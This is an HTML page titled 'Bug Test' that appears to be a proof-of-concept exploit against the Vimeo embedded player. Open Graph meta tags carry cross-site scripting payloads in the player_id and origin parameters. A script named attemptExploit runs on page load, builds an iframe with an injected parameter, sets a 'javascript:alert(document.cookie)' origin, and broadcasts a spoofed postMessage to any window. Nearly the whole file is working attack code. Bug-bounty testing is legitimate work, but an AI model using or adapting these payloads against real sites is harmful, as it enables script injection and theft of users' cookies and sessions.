<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1%26h=b2d568c32d%26player_id=alert(1)%26origin=javascript:alert(document.domain)">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?autoplay=1%26player_id=`${alert(1)}`">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="640">
    <meta property="og:video:height" content="360">
    <title>Bug Test</title>
    <script src="https://player.vimeo.com/api/player.js"></script>
    <script>
    async function attemptExploit() {
        try {
            // Test parameter injection with URL encoding
            const encodedUrl = encodeURIComponent('alert(1)');
            const frame = document.createElement('iframe');
            frame.src = `https://player.vimeo.com/video/403530213?autoplay=1&player_id=${encodedUrl}`;
            frame.allow = 'autoplay; fullscreen';
            document.getElementById('vimeo-player').appendChild(frame);

            // Test player initialization with encoded parameters
            const player = new Vimeo.Player('vimeo-player', {
                url: 'https://player.vimeo.com/video/403530213',
                autoplay: true,
                player_id: encodedUrl,
                origin: 'javascript:alert(document.cookie)'
            });

            // Test postMessage with encoded data
            window.parent.postMessage({
                event: 'ready',
                data: {
                    player_id: encodedUrl,
                    origin: 'javascript:alert(document.domain)'
                }
            }, '*');

        } catch(e) {
            console.error('Error:', e);
        }
    }

    window.onmessage = (e) => {
        console.log('Message received:', e.origin, e.data);
    };

    window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
